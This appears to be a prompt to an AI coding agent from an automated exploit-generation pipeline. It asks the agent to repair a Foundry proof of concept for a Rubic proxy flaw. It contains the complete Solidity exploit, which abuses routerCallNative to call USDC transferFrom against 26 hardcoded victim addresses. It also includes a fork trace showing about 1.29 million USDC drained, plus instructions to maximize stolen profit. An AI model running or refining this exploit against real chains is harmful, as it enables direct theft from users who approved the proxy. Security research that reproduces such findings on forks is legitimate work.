You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Public `routerCallNative` lets callers execute arbitrary token `transferFrom` calls through the proxy and steal approved funds
- claim: Both proxy variants expose `routerCallNative` with a caller-supplied `_params.router` target and caller-supplied raw `_data`. The reproduced exploit sets `router` to the USDC contract and encodes `_data` as `transferFrom(victim, attacker, amount)`, so the proxy itself performs the token call as the already-approved spender and transfers funds out of victims that previously approved the proxy.
- impact: Any user who has granted ERC20 allowance to either Rubic proxy can be permissionlessly drained up to the lesser of their balance and allowance. This is direct theft of user funds from existing approvals and is critical protocol-level loss.
- exploit_paths: ["Choose a victim that already approved one of the proxy contracts", "Set `_params.router` to the approved ERC20 token contract", "Encode `_data` as `transferFrom(victim, attacker, amount)`", "Call `routerCallNative(...)` so the proxy executes the token call as spender and transfers the victim's tokens to the attacker"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address owner, address recipient, uint256 amount) external returns (bool);
}

interface IRubicProxy1 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(BaseCrossChainParams calldata _params, bytes calldata _data) external;
}

interface IRubicProxy2 {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(
        string calldata _providerInfo,
        BaseCrossChainParams calldata _params,
        bytes calldata _data
    ) external;
}

contract FlawVerifier {
    struct Candidate {
        address victim;
        address proxy;
        uint8 variant;
        uint256 amount;
    }

    IERC20Like private constant USDC = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address private constant PROXY1 = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;
    address private constant PROXY2 = 0x33388CF69e032C6f60A420b37E44b1F5443d3333;
    address private constant INTEGRATOR = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;

    uint256 private constant CANDIDATE_COUNT = 26;
    uint256 private constant MAX_PROGRESSIVE_ROUNDS = 6;

    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "executed");
        _executed = true;

        Candidate[CANDIDATE_COUNT] memory ranked = _rankCandidatesByStealableAmount();
        uint256 positiveCount = _countPositive(ranked);
        if (positiveCount == 0) {
            _profitAmount = 0;
            return;
        }

        uint256 bestRounds = _determineBestRounds(ranked, positiveCount);
        uint256 balanceBefore = USDC.balanceOf(address(this));

        for (uint256 i = 0; i < bestRounds; i++) {
            _drainCandidate(ranked[i]);
        }

        _profitAmount = USDC.balanceOf(address(this)) - balanceBefore;
    }

    function profitToken() external pure returns (address) {
        return address(USDC);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _determineBestRounds(Candidate[CANDIDATE_COUNT] memory ranked, uint256 positiveCount)
        private
        pure
        returns (uint256 bestRounds)
    {
        uint256 cappedRounds = positiveCount < MAX_PROGRESSIVE_ROUNDS ? positiveCount : MAX_PROGRESSIVE_ROUNDS;
        if (cappedRounds <= 1) {
            return cappedRounds;
        }

        uint256 bestProjectedProfit = ranked[0].amount + ranked[1].amount;
        uint256 runningProjectedProfit = bestProjectedProfit;
        bestRounds = 2;

        for (uint256 rounds = 3; rounds <= cappedRounds; rounds++) {
            runningProjectedProfit += ranked[rounds - 1].amount;

            if (runningProjectedProfit > bestProjectedProfit) {
                bestProjectedProfit = runningProjectedProfit;
                bestRounds = rounds;
            } else {
                break;
            }
        }
    }

    function _drainCandidate(Candidate memory candidate) private {
        if (candidate.amount == 0) {
            return;
        }

        // Exploit path 1:
        // choose a victim that already approved one of the vulnerable Rubic proxies and
        // whose present USDC balance still supports a real transferFrom drain at the fork.
        address victim = candidate.victim;
        uint256 stealAmount = candidate.amount;

        // Exploit path 3:
        // encode _data as transferFrom(victim, attacker, amount) so the proxy forwards a
        // raw ERC20 pull using its own already-approved spender identity.
        bytes memory tokenTransferFromCalldata = abi.encodeWithSelector(
            IERC20Like.transferFrom.selector,
            victim,
            address(this),
            stealAmount
        );

        if (candidate.variant == 1) {
            IRubicProxy1.BaseCrossChainParams memory params1 = IRubicProxy1.BaseCrossChainParams({
                srcInputToken: address(0),
                srcInputAmount: 0,
                dstChainID: 0,
                dstOutputToken: address(0),
                dstMinOutputAmount: 0,
                recipient: address(0),
                integrator: INTEGRATOR,
                // Exploit path 2:
                // set _params.router to the already-deployed USDC token contract so the
                // vulnerable proxy issues the attacker-chosen call against that ERC20.
                router: address(USDC)
            });

            // Exploit path 4:
            // call routerCallNative(...) so the proxy itself executes USDC.transferFrom as
            // the spender approved by the victim, transferring funds to this contract.
            try IRubicProxy1(candidate.proxy).routerCallNative(params1, tokenTransferFromCalldata) {} catch {}
        } else {
            IRubicProxy2.BaseCrossChainParams memory params2 = IRubicProxy2.BaseCrossChainParams({
                srcInputToken: address(0),
                srcInputAmount: 0,
                dstChainID: 0,
                dstOutputToken: address(0),
                dstMinOutputAmount: 0,
                recipient: address(0),
                integrator: INTEGRATOR,
                // Exploit path 2:
                // set _params.router to the already-deployed USDC token contract so the
                // vulnerable proxy issues the attacker-chosen call against that ERC20.
                router: address(USDC)
            });

            // Exploit path 4:
            // call routerCallNative(...) so the proxy itself executes USDC.transferFrom as
            // the spender approved by the victim, transferring funds to this contract.
            try IRubicProxy2(candidate.proxy).routerCallNative("", params2, tokenTransferFromCalldata) {} catch {}
        }
    }

    function _rankCandidatesByStealableAmount() private view returns (Candidate[CANDIDATE_COUNT] memory ranked) {
        ranked[0] = _identifyApprovedVictim(0x6b8D6E89590E41Fa7484691fA372c3552E93e91b, PROXY1, 1);
        ranked[1] = _identifyApprovedVictim(0x036B5805F9175297Ec2adE91678d6ea0a1e2272A, PROXY1, 1);
        ranked[2] = _identifyApprovedVictim(0xED9c18C5311DBB2b757B6913fB3FE6aa22b1A5b0, PROXY1, 1);
        ranked[3] = _identifyApprovedVictim(0xff266f62a0152F39FCf123B7086012cEb292516A, PROXY1, 1);
        ranked[4] = _identifyApprovedVictim(0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D, PROXY1, 1);
        ranked[5] = _identifyApprovedVictim(0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B, PROXY1, 1);
        ranked[6] = _identifyApprovedVictim(0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981, PROXY1, 1);
        ranked[7] = _identifyApprovedVictim(0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a, PROXY1, 1);
        ranked[8] = _identifyApprovedVictim(0x915E88322EDFa596d29BdF163b5197c53cDB1A68, PROXY2, 2);
        ranked[9] = _identifyApprovedVictim(0xD6aD4bcbb33215C4b63DeDa55de599d0d56BCdf5, PROXY2, 2);
        ranked[10] = _identifyApprovedVictim(0x2afeF7d7de9E1a991c385a78Fb6c950AA3487dbA, PROXY2, 2);
        ranked[11] = _identifyApprovedVictim(0x21FeBbFf2da0F3195b61eC0cA1B38Aa1f7105cDb, PROXY2, 2);
        ranked[12] = _identifyApprovedVictim(0xDbDDb2D6F3d387c0dDA16E197cd1E490543354e1, PROXY2, 2);
        ranked[13] = _identifyApprovedVictim(0x58709C660B2d908098FE95758C8a872a3CaA6635, PROXY2, 2);
        ranked[14] = _identifyApprovedVictim(0xD2C919D3bf4557419CbB519b1Bc272b510BC59D9, PROXY2, 2);
        ranked[15] = _identifyApprovedVictim(0xfE243903c13B53A57376D27CA91360C6E6b3FfAC, PROXY2, 2);
        ranked[16] = _identifyApprovedVictim(0xd5BD9464eB1A73Cca1970655708AE4F560Efc6D1, PROXY2, 2);
        ranked[17] = _identifyApprovedVictim(0xd6389E37f7c2dB6De56b92f430735D08d702111E, PROXY2, 2);
        ranked[18] = _identifyApprovedVictim(0x9f3119BEe3766b2CD25BF3808a8646A7F22ccDDC, PROXY2, 2);
        ranked[19] = _identifyApprovedVictim(0x8a4295b205DD78Bf3948D2D38a08BaAD4D28CB37, PROXY2, 2);
        ranked[20] = _identifyApprovedVictim(0xf4BA068f3F79aCBf148b43ae8F1db31F04E53861, PROXY2, 2);
        ranked[21] = _identifyApprovedVictim(0x48327499E4D71ED983DC7E024DdEd4EBB19BDb28, PROXY2, 2);
        ranked[22] = _identifyApprovedVictim(0x192FcF067D36a8BC9322b96Bb66866c52C43B43F, PROXY2, 2);
        ranked[23] = _identifyApprovedVictim(0x82Bdfc6aBe9d1dfA205f33869e1eADb729590805, PROXY2, 2);
        ranked[24] = _identifyApprovedVictim(0x44a59A1d38718c5cA8cB6E8AA7956859D947344B, PROXY2, 2);
        ranked[25] = _identifyApprovedVictim(0xD0245a08f5f5c54A24907249651bEE39F3fE7014, PROXY2, 2);

        for (uint256 i = 0; i < ranked.length; i++) {
            uint256 maxIndex = i;
            for (uint256 j = i + 1; j < ranked.length; j++) {
                if (ranked[j].amount > ranked[maxIndex].amount) {
                    maxIndex = j;
                }
            }

            if (maxIndex != i) {
                Candidate memory temp = ranked[i];
                ranked[i] = ranked[maxIndex];
                ranked[maxIndex] = temp;
            }
        }
    }

    function _identifyApprovedVictim(address victim, address proxy, uint8 variant)
        private
        view
        returns (Candidate memory item)
    {
        uint256 balance = USDC.balanceOf(victim);
        uint256 approved = USDC.allowance(victim, proxy);
        uint256 amount = balance < approved ? balance : approved;

        item = Candidate({victim: victim, proxy: proxy, variant: variant, amount: amount});
    }

    function _countPositive(Candidate[CANDIDATE_COUNT] memory ranked) private pure returns (uint256 count) {
        for (uint256 i = 0; i < ranked.length; i++) {
            if (ranked[i].amount == 0) {
                break;
            }
            count++;
        }
    }
}

```

forge stdout (tail):
```
0000000000000000000000000000000677d6ec74fa352d4ef9b1886f6155384acd70d90000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Stop]
    │   ├─ [30702] 0x33388CF69e032C6f60A420b37E44b1F5443d3333::routerCallNative("", BaseCrossChainParams({ srcInputToken: 0x0000000000000000000000000000000000000000, srcInputAmount: 0, dstChainID: 0, dstOutputToken: 0x0000000000000000000000000000000000000000, dstMinOutputAmount: 0, recipient: 0x0000000000000000000000000000000000000000, integrator: 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90, router: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 }), 0x23b872dd000000000000000000000000dbddb2d6f3d387c0dda16e197cd1e490543354e10000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000005d5af1e20)
    │   │   ├─  emit topic 0: 0x3a84e53f89d2f7779a9c9a54779858ae0eb0b7760d607b445b6fd175c30a04d4
    │   │   │        topic 1: 0x000000000000000000000000677d6ec74fa352d4ef9b1886f6155384acd70d90
    │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─  emit topic 0: 0x25471ec9f39b4ceb20d58f63c37f9c738011f0babcc4b6af69bdd82984ca5f8e
    │   │   │        topic 1: 0x000000000000000000000000677d6ec74fa352d4ef9b1886f6155384acd70d90
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [13592] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(0xDbDDb2D6F3d387c0dDA16E197cd1E490543354e1, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 25059860000 [2.505e10])
    │   │   │   ├─ [12797] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transferFrom(0xDbDDb2D6F3d387c0dDA16E197cd1E490543354e1, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 25059860000 [2.505e10]) [delegatecall]
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000dbddb2d6f3d387c0dda16e197cd1e490543354e1
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000005d5af1e20
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─  emit topic 0: 0xfdfc2ea0331bf5b8bdaf1cf2c15124d38246c8eca2c7d79091b3c0b6ec5e24e5
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000677d6ec74fa352d4ef9b1886f6155384acd70d90000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000001200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Stop]
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 1293223180857 [1.293e12]
    │   │   └─ ← [Return] 1293223180857 [1.293e12]
    │   └─ ← [Stop]
    ├─ [196] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 1293223180857 [1.293e12]
    │   └─ ← [Return] 1293223180857 [1.293e12]
    ├─ [288] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 1293223180857 [1.293e12]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 1293223180857 [1.293e12])
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 1293223180857 [1.293e12])
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 16260580 [1.626e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2186)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 337.56ms (36.60ms CPU time)

Ran 1 test suite in 426.93ms (337.56ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 657955)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
